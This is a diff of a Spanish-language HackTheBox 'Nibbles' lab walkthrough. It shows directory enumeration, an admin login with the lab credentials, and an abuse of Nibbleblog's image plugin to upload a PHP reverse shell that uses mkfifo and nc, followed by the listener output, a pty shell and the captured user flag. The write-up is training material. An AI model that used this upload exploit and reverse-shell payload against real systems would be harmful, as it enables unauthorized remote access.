@@ -120,6 +120,7 @@ ___
 
 `R: 79c03865431abf47b90ef24b9695e148`
 
+Al revisar los directorios observamos que tenemos admin.php en la direccion de nibbleblog
 ~~~
 ┌──(root㉿kali)-[/home/kali]
 └─# gobuster dir -u http://10.129.138.102/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
@@ -155,43 +156,65 @@ Progress: 4059 / 4615 (87.95%)
 ~~~
 ![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/1.png)
 
+ingresamos a nibbleblog para indagar
 ![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/2.png)
 
+ingresamos al `admin.php`, en el ejercicio anterior pudimos obtener la contraseña y el usuario, `admin:nibbles`
 ![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/3.png)
 
+En la pagina principal no observamos nada interesante, pero al lado izquierdo tenemos varias opciones,
+ de las cuales la mas llamativa seria `plugins`
 ![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/4.png)
 
+En `plugins` vemos una opcion para cargar una imagen si cargamos un `archivo.php` como prueba veremos que aunque da error permite cargarlo esto nos da la posibilidad de inyectar y ejecutar codigo php como una reverse shell
 ![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/5.png)
 
+creamos un archivo con el codigo `<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc NUESTRA-IP 9443 >/tmp/f"); ?>` y lo guardamos como image.php en el ejemplo lo guarde como reverse-shell.php
 ![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/6.png)
 
 ![](https://github.com/jcca1992/INFOSEC/blob/HackTheBox/Getting%20Started/Images/Nibbles/7.png)
 
-
-
-creamos un archivo con el codigo `<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc NUESTRA-IP 9443 >/tmp/f"); ?>` y lo guardamos como image.php
-
->en firefox http://DIRECCION-IP/nibbleblog/content/private/plugins/my_image/image.php para activar el reverse shell
-
+Asignamos el puerto `9443` para que este a la escucha con `nc -lvnp 9443 `
 ~~~
 ┌──(root㉿kali)-[/home/kali]
 └─# nc -lvnp 9443             
 listening on [any] 9443 ...
-id
-id                                                                               
+~~~
+
+>en firefox http://DIRECCION-IP/nibbleblog/content/private/plugins/my_image/image.php para activar el reverse shell
+
+una vez que corramos el codigo `.php` tendremos acceso
+~~~
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 9443             
+listening on [any] 9443 ...
+                                                                              
 connect to [10.10.14.93] from (UNKNOWN) [10.129.138.102] 46598                   
 /bin/sh: 0: can't access tty; job control turned off                             
 $ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)                       
-$ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)                       
+$ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler) 
+$
+~~~
+
+Vamos a cargar una `shell` para poder movernos con facilidad, cargaremos `python 3` y listamos para ver que conseguimos
+~~~
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'                                
 nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ls    
 ls                                                                               
-db.xml  image.php                                                                
+db.xml  image.php
+~~~
+
+para resumir un poco, despues de revisar con `ls` y `cd`, descubri el directorio nibble asi que ingrese alli y consegui el archivo `user.txt`
+~~~
 nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler                                                                       
 <ml/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler                
 nibbler@Nibbles:/home/nibbler$ ls                                                
 ls                                                                               
-personal.zip  user.txt                                                           
+personal.zip  user.txt
+~~~
+
+abrimos el archivo con `cat` y tenemos el codigo solicitado
+~~~
 nibbler@Nibbles:/home/nibbler$ cat user.txt                                      
 cat user.txt                                                                     
 79c03865431abf47b90ef24b9695e148                                                 
